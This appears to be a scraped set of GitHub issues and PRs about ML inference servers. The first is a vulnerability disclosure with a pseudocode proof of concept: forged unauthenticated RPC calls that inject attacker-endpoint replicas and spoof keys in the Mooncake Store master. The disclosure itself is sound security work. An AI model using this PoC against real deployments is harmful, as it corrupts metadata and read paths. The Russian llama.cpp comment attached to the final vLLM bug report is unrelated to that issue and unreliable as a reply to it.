items.title: [Bug]: Fake completed replica injection and key spoofing via NotifyOffloadSuccess in Mooncake Store Master
items.author: yyymk
items.body_excerpt:
### Bug Report

### Summary

Mooncake Store Master's `NotifyOffloadSuccess` RPC (unauthenticated, default 0.0.0.0:50051) accepts caller-supplied offload results with no validation. An unauthenticated peer first forges `MountLocalDiskSegment` with its own UUID (satisfying the mounted-segment precondition) and then injects a COMPLETE disk-tier replica pointing at an attacker-chosen endpoint into any existing object, or fabricates metadata for keys that never existed — the master then reports those keys as existing with a completed replica at the attacker's endpoint. Runtime-confirmed on the master binary shipped in the 0.3.13.post1 wheel (latest release); no fix available. Suggested severity: High, CVSS 8.2.

### Details

`MasterService::NotifyOffloadSuccess` (mooncake-store/src/master_service.cpp) processes each caller-supplied (key, StorageObjectMetadata) pair: it clears any in-flight offloading task for the key, then calls `AddReplica(client_id, key, LOCAL_DISK replica{metadata.data_size, metadata.transport_endpoint, ReplicaStatus::COMPLETE})`. Nothing verifies that the caller owns the key, that an offload was ever scheduled, or that the endpoint belongs to the caller.

`AddReplica` widens the effect: when the object has no LOCAL_DISK replica yet (the normal case for a memory-resident object) the forged replica is appended; when the object does not exist at all, the call creates fresh metadata owned by the attacker — so the master's existence oracle and replica lists now answer for keys that were never written.

In 0.3.13 the handler requires `HasMountedLocalDiskSegment(client_id)` when offload is enabled; this is satisfied by first sending one forged `MountLocalDiskSegment(attacker_uuid, enable_offloading=true)`, which is itself unauthenticated. The `client_id` in these RPCs is a self-declared UUID with no binding to the connection.

This is distinct from CVE-2026-96763: that issue forges a segment at mount time to redirect transfers, while this one forges completed object replicas through the offload-completion path — a different method with a different missing check, operating on the object layer rather than the segment layer.

### PoC

Environment: Linux, the 0.3.13.post1 wheel's `mooncake_master` (offload enabled) and a victim client holding a memory-resident object `victim_inject_ky`. The attacker forges coro_rpc frames (20-byte header, magic=21; struct_pack bodies; observed function_ids: MountLocalDiskSegment=673169545, NotifyOffloadSuccess=771250242, GetReplicaList=528413044, ExistKey=2302172937). The 0.3.13 `NotifyOffloadSuccess` body is (UUID, vector<OffloadTaskItem{tenant,key,size}>, vector<StorageObjectMetadata{bucket_id,offset,key_size,data_size,transport_endpoint}>):

```python
call(MountLocalDiskSegment, uuid=ATTACKER_UUID, enable=True)          # ok

call(NotifyOffloadSuccess, uuid=ATTACKER_UUID,
     items=[OffloadTaskItem(tenant="default", key="victim_inject_ky", size=16)],
     metas=[StorageObjectMetadata(bucket_id=1, data_size=16,
                                  endpoint="192.168.105.123:39999")]) # ok
# GetReplicaList("victim_inject_ky") now shows a COMPLETE LOCAL_DISK
# replica owned by the attacker UUID with transport_endpoint
# "192.168.105.123:39999" alongside the victim's memory replica

# key spoof on a key that never existed:
call(GetReplicaList, key="spoofed_key_xyz0")   # OBJECT_NOT_FOUND (-704)
call(NotifyOffloadSuccess, ... key="spoofed_key_xyz0" ...)            # ok
call(ExistKey,     key="spoofed_key_xyz0")     # expected<bool> = true
call(GetReplicaList, key="spoofed_key_xyz0")   # attacker's UUID +
                                               # attacker endpoint, COMPLETE
```

All steps observed verbatim in the captured request/response hex on 0.3.13.post1; the before/after `GetReplicaList` pair for `spoofed_key_xyz0` (-704 → completed replica at the attacker endpoint) is the complete spoof demonstration. Expected secure behavior: offload completion must be bound to an authenticated client and to a task the master scheduled, with the endpoint taken from the registered segment rather than the request.

### Impact

Any network peer that can reach the master RPC port, without credentials, corrupts the persistence-tier metadata plane in two ways. Replica forgery: the master believes an attacker-controlled endpoint holds completed disk replicas of arbitrary victims' keys; any later promotion or disk-tier read that trusts this record can be served from the attacker's endpoint (attacker-supplied cache contents — an integrity attack on the read path; the end-to-end promotion fetch was not demonstrated in this report). Key spoofing: keys that never existed become "existing" with attacker-owned metadata, poisoning the existence oracle that clients and eviction rely on. The call also clears in-flight offloading tasks for arbitrary keys (the disruption variant was not claimed). Integrity of the metadata and read path; availability is not directly affected. Suggested CVSS:3.1 vector AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L (8.2), CWE-862. Affected: mooncake-store master <= 0.3.13.post1 (latest release), no patched version yet.

### Before submitting...

- [x] Ensure you searched for relevant issues and read the [documentation]

comments.author: he-yufeng
comments.body:
Code-confirmed on current main (245e7106). Both halves of the report check out.

Replica forgery: `MasterService::NotifyOffloadSuccess` (mooncake-store/src/master_service.cpp:8648) clears the in-flight offload task for a key when one exists, but when none exists it still falls through to `AddReplicaForRetainedClient`, which appends the caller-supplied COMPLETE LOCAL_DISK replica (attacker-chosen `transport_endpoint` included) with no check that an offload was ever scheduled or that the caller owns the key. The only admission gate is `HasMountedLocalDiskSegment(client_id)` under `enable_offload_` (5479), and that registry is populated by the equally unauthenticated `MountLocalDiskSegment`, so the precondition is self-declared end to end.

Key spoofing: for a key that never existed, `AddReplicaForRetainedClient` runs `accessor.Create(client_id, ...)` at 5484, so the master mints fresh attacker-owned metadata and starts answering `ExistKey`/`GetReplicaList` for it, exactly as the PoC's -704 to completed-replica flip shows.

One adjacent observation, not security-relevant: the `OBJECT_NOT_FOUND` continue in `NotifyOffloadSuccess`'s fall-through (8806) looks unreachable from this caller, since `AddReplicaForRetainedClient` creates the object rather than returning that error. Dead-ish error handling worth tidying whenever this area gets its real fix.

Same root cause as #4474/#4475/#4478: no caller identity on the master RPC plane, so field-level checks inside the request bind nothing. The report's suggested shape (bind completion to a scheduled task, take the endpoint from the registered segment instead of the request) is the right one once identity exists. Severity and advisory handling I leave to the core team.

items.title: [docs] Slurm: fix multi-node example, add single-node and offline batch examples
items.author: holtwood
items.body_excerpt:
## Motivation

Contributes to #3244.

The existing multi-node example expands `$SLURM_NODEID` in the batch shell, before `srun` creates its per-task environments. Both launches can therefore receive the same node rank. The existing readiness loop also checks only whether a TCP port is open.

This PR covers basic multi-node serving, single-node serving, and offline batch inference. #29991 has a separate scope around PD disaggregation and Apptainer.

## Changes

- Evaluate `$SLURM_PROCID` inside each `srun` task and use Slurm `%n` patterns for per-node logs.
- Use configurable HTTP and distributed-init ports, a bounded `/health` check, and early process-exit detection.
- Add a single-node serving job with cleanup and an SSH forwarding hint.
- Add an offline job that writes a real Python file with a `__main__` guard, as required by the Engine multiprocessing setup.
- Document the log-directory prerequisite and cluster-specific scheduler, network, port, and model-cache settings.

## Validation

- `bash -n` on all three batch scripts.
- `mint validate`.
- `mint broken-links`.
- Parsed and mock-executed the offline Python example, including Engine context cleanup.
- Checked task-side rank expansion with `SLURM_PROCID=0` and `SLURM_PROCID=1`.
- Cross-checked the Engine `spawn` setup, context-manager support, `/health` behavior, and referenced server arguments against the PR base revision.

I did not run these examples end to end on a Slurm GPU cluster. The `#SBATCH` resource values, partition name, network interfaces, and port availability remain site-specific.

<!-- pr-states:start -->

items.title: [Bug] trigger_cuda_user_coredump misses the default pipe: driver creates corepipe_<host>_<pid>, helper expects documented corepipe.cuda.<host>.<pid>
items.author: henrylhtsang
items.body_excerpt:
**Checklist**

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version.
- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.
- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

**Describe the bug**

`_resolve_cuda_coredump_pipe_path` builds the default user-trigger pipe as `corepipe.cuda.<hostname>.<pid>` ([cudacore_pyspy_dump_utils.py#L35](https://github.com/sgl-project/sglang/blob/7bb5c9668568ad0099fc4420077b99ab2fe92ae9/python/sglang/srt/utils/cudacore_pyspy_dump_utils.py#L35)), matching NVIDIA's documented default — but the CUDA driver actually creates the FIFO as `corepipe_<hostname>_<pid>` (underscores) in the process working directory. With `CUDA_COREDUMP_PIPE` unset, [`trigger_cuda_user_coredump`](https://github.com/sgl-project/sglang/blob/7bb5c9668568ad0099fc4420077b99ab2fe92ae9/python/sglang/srt/utils/cudacore_pyspy_dump_utils.py#L95) opens a path that does not exist and no GPU core dump is generated. Not hit when `CUDA_COREDUMP_PIPE` is set explicitly (e.g. via `--crash-dump-folder`), which is likely why it went unnoticed.

This is driver behavior, and the docs have been wrong on every version checked: the pipe exists after `cuInit` + primary-context retain, before any cudart call, and the template `corepipe_%h_%p` is embedded in `libcuda.so` — driver 550.54.15, 575.57.08, 580.159.03 and the 13.0.3/13.2.0/13.3.1/13.4.1 compat builds alike, while `cuda.h` and the cuda-gdb guide have documented `corepipe.cuda.HOSTNAME.PID` since the feature shipped. A [2021 NVIDIA forum thread](https://forums.developer.nvidia.com/t/manually-take-memory-dump/194048) shows a user confused by exactly this (expected the documented name, found `corepipe_akravets-dt_81675` in NVIDIA's own reply), so the mismatch predates CUDA 12.

**Reproduction**

1. Start any CUDA process with the trigger enabled and no pipe override, e.g. `CUDA_ENABLE_USER_TRIGGERED_COREDUMP=1 python3 -c "import torch,time; torch.zeros(8, device='cuda'); time.sleep(600)"`.
2. Observe the FIFO in its working directory: `ls corepipe*` shows `corepipe_<hostname>_<pid>`, not the documented `corepipe.cuda.<hostname>.<pid>`.
3. Call `trigger_cuda_user_coredump()` from sglang; it logs "CUDA coredump pipe not found for PID ...: .../corepipe.cuda.<hostname>.<pid>" and no dump is written.

**Environment**

- sglang: master @ 7bb5c9668568ad0099fc4420077b99ab2fe92ae9 (code path unchanged in latest master)
- GPU: NVIDIA B300, driver 580.159.03; also confirmed in driver binaries 550.54.15 and 575.57.08
- CUDA runtime: 13.0.3 (behavior is in libcuda, so toolkit version does not affect it)
- OS: Linux x86_64, Python 3.11

**Suggested fix**

Resolve both naming patterns (or glob `corepipe*<pid>`) in `_resolve_cuda_coredump_pipe_path` so the trigger matches the pipe the driver actually creates.

items.title: [Feature]: Share non-streaming chat message assembly between `OpenAIServingChat` and batch derender
items.author: hickeyma
items.body_excerpt:
### 🚀 The feature, motivation and pitch

Tracking issue for the "Unify (not mirror) the assembly path" item in #42729, raised by @sagearc in the #48617 review (https://github.com/vllm-project/vllm/pull/48617#pullrequestreview-4695988048).

#### Why

Batch chat derender (`OnlineDerenderer._derender_chat`) builds the assistant message itself instead of  sharing the code in `OpenAIServingChat.chat_completion_full_generator`. Both run the same `Parser.parse()` over the same tokens. They differ in what happens after:

- which `tool_choice` branch applies
- `content or ""` for named / required tool choice
- tool call IDs
- the `finish_reason` rewrite to `tool_calls`

The two have already drifted three times:

- `null` vs `""` content, fixed in #48617
- `finish_reason`: batch derender passes through the generate side's `stop` for tool calls (fix in open PR #47931)
- tool call IDs: batch derender builds `ToolCall(id=random_uuid())` and drops the parser's ID, while coupled chat uses `tc.id or make_tool_call_id()`. Batch IDs lose the `chatcmpl-tool-` prefix, and Kimi K2 `functions.<name>:<idx>` IDs are lost. A fix will follow once #47931 merges, since both change the same block of `_derender_chat`.

The round trip parity test (`test_derender_parity.py`) missed the last two. It compares only tool names and arguments, and it feeds the coupled response's `finish_reason` into derender instead of the engine's.

#### Proposal

Pull the post parse message assembly out of `chat_completion_full_generator` into a helper that both paths call. It takes the parser output (`reasoning`, `content`, `tool_calls`), the request and the tool config and returns the `ChatMessage` fields and the final `finish_reason`. It owns:

- the `tool_choice` branches (none / named / required / auto)
- tool call IDs (`tc.id or make_tool_call_id()`)
- `content or ""` for named / required
- `auto_tools_called` and the `finish_reason` rewrite

Constraints:

- **Subclass hooks stay.** `_create_chat_message` and `_finalize_response_message` are overridden by the Cohere v2 handler (`cohere/serving.py`). The helper returns fields and serving still builds the message through the hooks. Derender doesn't subclass `OpenAIServingChat`.
- **No behavior change for `/v1/chat/completions`.** This is the hot non-streaming path.
- **Batch only.** Streaming is #57572.

#56851 `derender` level reuses `OnlineDerenderer.derender_chat`, so it picks this up without adding a third copy.

#### Done when

- [ ] Helper extracted from `chat_completion_full_generator`. Existing chat completion and tool / reasoning parser tests pass unchanged.
- [ ] `_derender_chat` uses it.
- [ ] #47931 and the tool call ID fix have landed first, so the refactor changes no behavior on either path. The tool call ID fix also makes `test_derender_parity.py` feed the engine's `finish_reason` and check tool call ID format.

### Alternatives

- **Rely on the parity test.** Cheaper  and it should be tightened anyway. But it runs one model with one parser configuration and it has already missed two of three drifts.
- **Fold this into #57572.** Both touch `OpenAIServingChat` but the streaming step works on deltas and this one builds a whole message. Keeping them apart keeps each serving change reviewable on its own. If the helpers end up sharing code (the `finish_reason` rewrite, tool call IDs), that can happen in whichever lands second.

### Additional context

- RFC #42729, "Unify (not mirror) the parse/assembly path"
- #48617 (parity test), #47931 (`finish_reason` fix, open). The tool call ID fix follows after #47931.
- #57572: streaming counterpart
- #56851: reuses `derender_chat` for its `derender` level

cc @sagearc @chaunceyjiang

### Before submitting a new issue...

- [x] Make sure you already searched for relevant issues, and asked the chatbot living at the bottom right corner of the [documentation page](https://docs.vllm.ai/en/latest/), which can answer lots of frequently asked questions.

items.title: [Bug]: `kv_cache_dtype="fp8"` auto-selects the FLASHINFER attention backend without a usable FlashInfer JIT and crashes instead of falling back to TRITON_ATTN
items.author: fede-kamel
items.body_excerpt:
### Your current environment
vLLM nightly `0.30.1rc1.dev740+gaad4579bb` installed from the wheel, torch 2.13.0+cu132, RTX PRO 4000 Blackwell (sm_120), driver 610.57. No CUDA toolkit and no `flashinfer-cubin`.

### 🐛 Describe the bug
```python
# VLLM_USE_FLASHINFER_SAMPLER=0 avoids the separate sampler crash (#49497)
from vllm import LLM
LLM("Qwen/Qwen3-0.6B", kv_cache_dtype="fp8", max_model_len=2048)
```
```
WARNING [flashinfer.py:123] FlashInfer kernels are disabled: flashinfer-cubin is not installed and nvcc (CUDA_HOME, CUDA_PATH, PATH or /usr/local/cuda) or ninja (PATH) is missing. ...
INFO [cuda.py:526] Using FLASHINFER attention backend out of potential backends: ['FLASHINFER', 'TRITON_ATTN'].
...
RuntimeError: Could not find nvcc and default cuda_home='/usr/local/cuda' doesn't exist
```

vLLM itself reports that FlashInfer is disabled, then selects the FLASHINFER attention backend a few lines later.

Passing `attention_backend="TRITON_ATTN"` makes it work. On this GPU, FlashAttention rejects fp8 KV, so FLASHINFER is the next candidate. But the FlashInfer attention backend is never checked for availability: `supports_compute_capability` only checks the capability range, and the configuration validation never consults `has_flashinfer()`.

A related gap: `has_flashinfer()` (`vllm/utils/flashinfer.py`) returns True as soon as `flashinfer-cubin` is installed. That package only ships trtllm-gen cubins, while attention, sampling, CUTLASS MoE and the mxfp8 GEMM are JIT modules that still need nvcc or `flashinfer-jit-cache`. So on SM120 the same crash also happens with `flashinfer-cubin` installed.

Suggested fix: treat FLASHINFER as invalid during auto-selection when FlashInfer can't JIT (no nvcc+ninja and no jit-cache), so selection falls through to TRITON_ATTN. Have `has_flashinfer()` reflect whether the JIT modules can actually be built, not just whether cubins exist.

Related: #49497 (sampler), PRs #49314 and #51741 (sampler only). PR #58360 notes that "FlashInfer attention is not gated by has_flashinfer()".

items.title: [Bug] GLM-5.3-Flash-NVFP4 teacher-forced logprobs drift vs v0.5.20 on SM100 after 2026-09-18..09-21 (suspect #39688 KDA fusion gate)
items.author: jmeadlock
items.body_excerpt:
### Checklist
- [x] I searched existing issues (#41494, #40843, #36830 are adjacent but do not report this)
- [x] Reproducible on every nightly from 2026-09-21 through 2026-09-27

### Describe the bug

`nvidia/GLM-5.3-Flash-NVFP4` @ `09b04e5e` on one DGX Station GB300 (SM100, 250.7 GiB) is **bit-identical** to SGLang v0.5.20 (`94602c9c`, `lmsysorg/sglang:v0.5.20-cu130` + transformers 5.16.1) and to the 2026-09-18 nightly (`20518d85`). Every nightly from 2026-09-21 (`0f6761b5`) through 2026-09-27 (`425a1f8f`) is **bit-identical to each other and drifted** vs that control.

Gate, same weights, same flags, same box: teacher-forced log-probs of a 2,857-token reference text vs the v0.5.20 server, plus greedy on 20 prompts.

| build | TF mean \|Δlogp\| vs v0.5.20 | TF p99 | greedy identical |
|---|---|---|---|
| v0.5.20 `94602c9c` | 0.000 | 0.000 | 20/20 |
| nightly 09-18 `20518d85` | 0.000 | 0.000 | 20/20 |
| nightly 09-21 `0f6761b5` | **0.1391908979** | 1.93 | 1/20 |
| nightly 09-22 … 09-27 (`582389ce`, `06008c17`, `8ca82118`, `425a1f8f`) | 0.1391908979 (identical to the digit) | 1.93 | 1/20 |

So the window is `20518d85..0f6761b5` (184 commits) and the change is one deterministic edit to the forward pass, not kernel churn. Tools 10/10 on every build — a tool-call smoke does not see it.

**Launch (abridged):** `--quantization modelopt_fp4 --kv-cache-dtype fp8_e4m3 --max-mamba-cache-size 48 --mem-fraction-static 0.85 --context-length 1048576 --tool-call-parser glm47 --speculative-algorithm DFLASH --speculative-draft-model-path incoai/GLM-5.3-Flash-DFlash2@7d74cdd8 --speculative-dflash-block-size 7 --speculative-draft-attention-backend fa4`. Routed experts are NVFP4 (modelopt/CUTLASS path); attention (KDA + DSA/MLA) is unquantized in this checkpoint (#38621).

### Already ruled out
- #40105 (`c46bf5e9`, in the window): setting `SGLANG_FLASHINFER_MOE_FUSED_FINALIZE=1` on the 09-27 image does not move the delta at all.

### Leading suspect: #39688 (`c8eb54c4`, 2026-09-20)

Before it, `Glm5NextLinearAttention.do_fuse_qkvbfg = quant_config is None and …`. After it, `_can_fuse_proj` returns True for `modelopt_fp4` / `modelopt_fp8` / `modelopt_mixed` whenever the source projections are `UnquantizedLinearMethod` — which is exactly this checkpoint (NVIDIA quantized only the routed experts). So the fused KDA qkv/bfg projection path was **off** on v0.5.20 and is **on** from 09-21. The same commit also moves the raw-beta sigmoid from `torch.sigmoid` into `kda_gate_chunk_cumsum` (`tl.sigmoid`). The PR's test is CPU fp32 `atol=1e-5`, not an SM100 identity check.

#39200 (`2fa6b94e`) is also in the window but returns `None` above 16 tokens, so it cannot by itself explain a 2,857-token extend. #39695 (`9f21fbc3`, indexer/Q-quant stream overlap) is the second suspect.

I am running a revert of `c8eb54c4` overlaid on the `0f6761b5` image tonight and will post the TF/greedy result here.

### Why it matters
09-27 nightly + `--enable-linear-replayssm-spec` (#40517) gives KV pool 577K → 857K tokens (+48%), C1 +11%, code +13% on this box — and we cannot take it while the target forward is off the v0.5.20 numerics.

### Ask
Treat a teacher-forced log-prob match vs v0.5.20 on `nvidia/GLM-5.3-Flash-NVFP4` (SM100, modelopt NVFP4, fp8 KV) as a regression gate for glm5_next KDA fusion, or expose a flag to restore the `quant_config is None` fusion gate. Happy to run any candidate on this hardware.

### Environment
DGX Station GB300 · Ubuntu 24.04.4 · kernel 6.17.0-1031-nvidia-64k · driver 595.84 · CUDA 13.2 · torch 2.13.0+cu130 · transformers 5.16.1 · tokenizers 0.23.2.
Full receipts (per-rung TF/greedy JSON, launch lines): https://github.com/J-M-Recipes/recipes/tree/main/recipes/dgx-station-gb300/glm-5.3-flash-nvfp4-dflash2/results/2026-09-27-round6-drift-bisect

items.title: [Feature] Integrate Cake kernels via FlashInfer: model-by-model tracker
items.author: yyihuang
items.body_excerpt:
**End-to-end validation and issue reporting:** Our shape coverage and correctness have not yet been validated end to end in model serving. If you encounter (1) end-to-end accuracy degradation, (2) unsuitable API requirements, such as unnecessarily requiring contiguous inputs, or (3) faster kernel benchmarks but worse end-to-end performance because the shapes optimized by the kernel do not cover the actual model-serving workload, please open an issue and tag @yyihuang with the affected kernel, the missing or problematic shape(s), and relevant model/serving details or a reproducer. We will resolve reported issues within **6 hours**.

## Motivation

Track integration of Cake kernels already delivered through FlashInfer into SGLang, grouped by the models that requested them. The upstream inventory is [flashinfer-ai/flashinfer#4254](https://github.com/flashinfer-ai/flashinfer/issues/4254); model requirements below come from its subissues and the linked implementation PRs.

The proposed integration is through FlashInfer's public/prepared APIs. Each task should connect the relevant model operator, weight/cache layout, and execution mode to an eligible kernel, then measure the complete serving path. Upstream kernel benchmarks are useful starting points, not claims of SGLang end-to-end speedup.

**Snapshot: 2026-10-03 (UTC; October 2 in US Pacific); FlashInfer main [46340689a5ab](https://github.com/flashinfer-ai/flashinfer/commit/46340689a5ab5665ab39f6281dac4d021d7ae94b).** “Merged” below means available in upstream FlashInfer, not necessarily in a released wheel or integrated here. Open follow-ups are explicitly marked and are not included in the merged coverage. Most listed kernels target SM100/SM103; exact architecture, SM-count, dtype, layout, and shape admission remain API-specific. Let the serving adapter retain its existing backend for configurations outside those contracts.

Notation: `T/M` = token rows, `B` = requests, `Q` = query tokens per request, `S` = KV length. MoE tuples are **(hidden size, expert intermediate size, number of experts, top-k)**; an intermediate size marked “local” is after TP sharding. Enumerated benchmark shapes are evidence points, not an assertion that every combination is supported.

## Integration and acceptance

- [ ] Pin a FlashInfer revision/release containing the required merged APIs and register backend selection at the existing operator boundary.
- [ ] Check the selected release branch separately: [#5978](https://github.com/flashinfer-ai/flashinfer/pull/5978) is merged into `release-v0.7.1` only and reverts the BF16 head-dim-256 small-M speculative-decode route because of an intermittent B200 hang. This is a separate route from the E4M3/page-64 DCP entries below; a merge on the release branch does not establish a fix on main.
- [ ] Prepare weights, plans, output buffers, and workspaces before graph capture; account for changing request lengths, routing, state indices, and graph buckets.
- [ ] Validate each listed model/checkpoint, quantization recipe, TP/EP/CP configuration, and state/cache layout. Cover prefill, decode, speculative verification, ragged batches, and prefix-cache reuse where relevant.
- [ ] Compare against the current engine backend on model quality, TTFT, TPOT, throughput, and memory. Record the actual selected route and unsupported configurations before changing defaults.

SGLang already has model/operator boundaries for these families. Existing integration work is linked below so this tracker can be completed by extending or landing those changes.

## 1. Kimi-K3 / Kimi-K3-NVFP4 / Kimi-K3 vision

Requirements: [NVFP4 end-to-end #4568](https://github.com/flashinfer-ai/flashinfer/issues/4568), [TP12 #4542](https://github.com/flashinfer-ai/flashinfer/issues/4542), [ragged MLA/DCP #4658](https://github.com/flashinfer-ai/flashinfer/issues/4658), [NVFP4 MLA #4644](https://github.com/flashinfer-ai/flashinfer/issues/4644), [W4A8 SiTU #5156](https://github.com/flashinfer-ai/flashinfer/issues/5156).

Start from [`kimi_k3.py`](https://github.com/sgl-project/sglang/blob/main/python/sglang/srt/models/kimi_k3.py) for KDA/MLA/LatentMoE and [`kimi_k3_vl.py`](https://github.com/sgl-project/sglang/blob/main/python/sglang/srt/models/kimi_k3_vl.py) for the vision tower. Preserve the model's layer ordering, TP reductions, state-cache semantics, and ModelOpt checkpoint preparation.

| Integration task | Covered shape / contract | FlashInfer delivery / upstream status |
|---|---|---|
| KDA prefill and fused decode | D=128. Fused one-token decode includes H=8 for TP12, plus H=12/24/32/48/96; BF16/FP32 indexed recurrent states and width-4 convolution. Prefill consumes strided q/k/v views of packed `[T,3*H*128]` projection output without densification. Prefill checkpoint outputs are BF16; FP32 checkpoints and `checkpoint_state_indices` are not admitted by the Cake prefill route. Recurrent T=1 decode with explicit `cu_seqlens` is outside the explicit Cake contract; `auto` now respects that guard. | **Merged:** `recurrent_kda(..., backend="cake")` and `fused_kda_decode(..., backend="cake")`; [#5551](https://github.com/flashinfer-ai/flashinfer/pull/5551), [#5846](https://github.com/flashinfer-ai/flashinfer/pull/5846); selector/binding updates [#5901](https://github.com/flashinfer-ai/flashinfer/pull/5901) and [#5919](https://github.com/flashinfer-ai/flashinfer/pull/5919) preserve the public API and served shape contracts; explicit-`cu_seqlens` auto-dispatch fix [#5760](https://github.com/flashinfer-ai/flashinfer/pull/5760); [API](https://github.com/flashinfer-ai/flashinfer/blob/main/flashinfer/kda.py). |
| Dense FP8 MLA and ragged/DCP MLA | Kimi latent=512, RoPE=64, E4M3 query/cache, page=64; registered H=12/96 decode and Q<=8 MTP paths. The separate var-Q DCP API accepts BF16 or FP8 query/cache, H<=128, registered pages 32/64/128, compact cumulative query lengths and rank-local KV metadata; returns BF16 output + FP32 natural-log LSE. Caller performs the cross-rank

items.title: [Bug][SM120] MTP speculative decoding acceptance rate drops to 0% on nightly with native FLASHINFER_MLA_SPARSE_SM120 backend (GLM-5.3-Flash)
items.author: Lei-010
items.body_excerpt:
## Environment
- vLLM: `0.30.1rc1.dev539+g5b6b657e1` (nightly wheel, 2026-10-02 build, commit `5b6b657e1`)
- Hardware: 8x RTX PRO 6000 (SM120), PCIe, no NVLink
- Model: GLM-5.3-Flash (FP8 checkpoint, TP=8)
- flashinfer-python: 0.7.0
- Base image: vllm-openai v0.30.0 + nightly wheel force-reinstall (no-deps)

## Observed behavior
MTP speculative decoding drafts tokens but the acceptance rate is **exactly 0%** — every drafted token is rejected. Decode speed falls back to non-speculative baseline (~80 tok/s vs ~163-190 tok/s with working MTP).

SpecDecoding metrics from server log (eager mode, spec_tokens=3, 512-token essay generation):

```
Mean acceptance length: 1.00, Accepted throughput: 0.00 tokens/s,
Drafted throughput: 82.20 tokens/s, Accepted: 0 tokens, Drafted: 822 tokens,
Per-position acceptance rate: 0.000, 0.000, 0.000, Avg Draft acceptance rate: 0.0%
```

## Three-leg isolation (all on identical config: fp8, TP8, mem 0.94, block-size 2304, mtp, max-model-len 1M)

| Leg | Mode | spec_tokens | Acceptance |
|---|---|---|---|
| 1 | CUDA graph (default) | 3 | 0% (76-83 tok/s) |
| 2 | --enforce-eager | 3 | 0% |
| 3 | --enforce-eager | 1 | 0% (100 drafted / 0 accepted) |

All three legs rule out graph-mode interaction and multi-step draft-forward as the cause.

## Key log lines

```
(Worker_TP0) speculator.py:116 Fused multi-step draft decode is not supported by attention backend(s) DEEPSEEK_V32_INDEXER, FLASHINFER_MLA_SPARSE_SM120, KPOOL_TAIL; falling back to rebuilding attention metadata between draft steps.
(APIServer) speculative.py:1136 method `glm5_next_mtp` is deprecated and replaced with mtp.
(APIServer) interface.py:1336 Unknown vLLM environment variable detected: VLLM_ATTENTION_BACKEND
```

The nightly auto-selects the native `FLASHINFER_MLA_SPARSE_SM120` backend (`VLLM_ATTENTION_BACKEND` env no longer recognized). The target model's forward is correct (generations are coherent), but the MTP drafter output is systematically rejected — suggesting the draft forward pass produces wrong logits under the native SM120 attention path.

## Working baseline (for contrast)
A community image based on v0.30.0 with a backported SM90 NoPE sparse-MLA path (forced `VLLM_ATTENTION_BACKEND=FLASHINFER_MLA_SPARSE_SM90`, flashinfer 0.6.18.dev20260819) on the **same hardware, same checkpoint, same spec config** achieves:
- Mean acceptance ~60.7%, acceptance length ~2.8
- decode 163-190 tok/s

So the regression is specific to the nightly native SM120 backend's interaction with MTP drafting (or the drafter's attention path), not the model or hardware.

## Reproduce

```
docker run --gpus all -v /path/GLM-5.3-Flash:/model:ro \
  -v vllm-0.30.1rc1.dev539...x86_64.whl:/tmp/nightly.whl:ro \
  --entrypoint bash vllm/vllm-openai:v0.30.0 \
  -c 'pip install --no-deps --force-reinstall /tmp/nightly.whl && \
      vllm serve /model --served-model-name glm-5.3-flash --trust-remote-code \
      --tensor-parallel-size 8 --quantization fp8 --max-model-len 1048576 \
      --max-num-seqs 256 --gpu-memory-utilization 0.94 --block-size 2304 \
      --no-enable-flashinfer-autotune --enable-auto-tool-choice \
      --tool-call-parser glm47 --reasoning-parser glm45 \
      --speculative-config "{\"method\":\"mtp\",\"num_speculative_tokens\":3}"'
```

Then generate ~512 tokens and check `SpecDecoding metrics` lines: acceptance 0%.

Happy to provide full server logs or run additional diagnostics on request.

comments.body:
**Документация: Работа с `llama.cpp` b6286 (август 2025)**

**1. Изменения в архитектуре и API**

*   **Изменение публичного API:** Прямой доступ к внутренним библиотекам `ggml` и `gguf` через их заголовочные файлы (`ggml/ggml.h`, `ggml/gguf.h`) **больше не является публичным или рекомендуемым**. Функции вроде `gguf_init_from_file`, `gguf_get_n_tensors` и т.д. скрыты.
*   **Унификация API:** Всё взаимодействие с моделью, её метаданными и тензорами теперь должно происходить **только** через унифицированный API, предоставляемый в **`include/llama.h`** (и `include/llama-cpp.h` для C++).
*   **Изменение структуры `include`:** Публичные заголовки теперь находятся непосредственно в `include/`. Внутренние заголовки `ggml` перемещены в `ggml/include/`.

**2. Создание собственного примера/приложения (например, `qedit`)**

*   **Расположение:** Поместите исходный код примера (например, `qedit.cpp`) и его `CMakeLists.txt` в подкаталог `examples/<имя_примера>/` внутри корня проекта `llama.cpp`. Например: `llama.cpp/examples/qedit/`.
*   **`CMakeLists.txt` примера:**
    ```cmake
    cmake_minimum_required(VERSION 3.16)
    project(<имя_примера> CXX) # Замените <имя_примера> на имя вашего проекта

    set(TARGET <имя_примера>)
    add_executable(${TARGET} <имя_файла>.cpp) # Замените <имя_файла>.cpp на имя вашего .cpp файла

    target_compile_features(${TARGET} PRIVATE cxx_std_17)

    # Указываем include-путь к llama.h
    target_include_directories(${TARGET} PRIVATE
        ${CMAKE_SOURCE_DIR}/include    # папка с llama.h
        # ${CMAKE_SOURCE_DIR}/common   # Если используете заголовки из common
        # ${CMAKE_SOURCE_DIR}/ggml/include # Только если требуется прямой доступ к внутренним ggml (не рекомендуется)
    )

    # Линкуем необходимые библиотеки
    target_link_libraries(${TARGET} PRIVATE
        # common     # Если используете утилиты из common
        llama        # ОСНОВНАЯ библиотека, предоставляющая API из llama.h
        # ggml       # Обычно не нужно явно указывать, так как llama зависит от ggml.
                     # Но можно оставить для ясности.
        # ggml-cuda  # НЕ НУЖНО. Отдельная цель ggml-cuda НЕ СОЗДАЕТСЯ.
                     # Функциональность CUDA интегрирована в основную библиотеку ggml.
        ${CMAKE_THREAD_LIBS_INIT} # Если требуется
    )
    ```
*   **Использование API:** В коде вашего примера используйте только функции, объявленные в `include/llama.h`. Примеры функций:
    *   `llama_backend_init()`, `llama_backend_free()`: Инициализация/деинициализация бэкенда.
    *   `llama_model_default_params()`: Получение параметров модели по умолчанию.
    *   `llama_load_model_from_file()`: Загрузка модели.
    *   `llama_model_meta_count()`, `llama_model_meta_key_by_index()`, `llama_model_meta_val_str_by_index()`: Доступ к метаданным модели.
    *   `llama_model_n_embd()`, `llama_model_n_ctx_train()`, `llama_model_n_params()`: Получение информации о модели (некоторые могут требовать активного контекста).
    *   `llama_free_model()`: Освобождение модели.

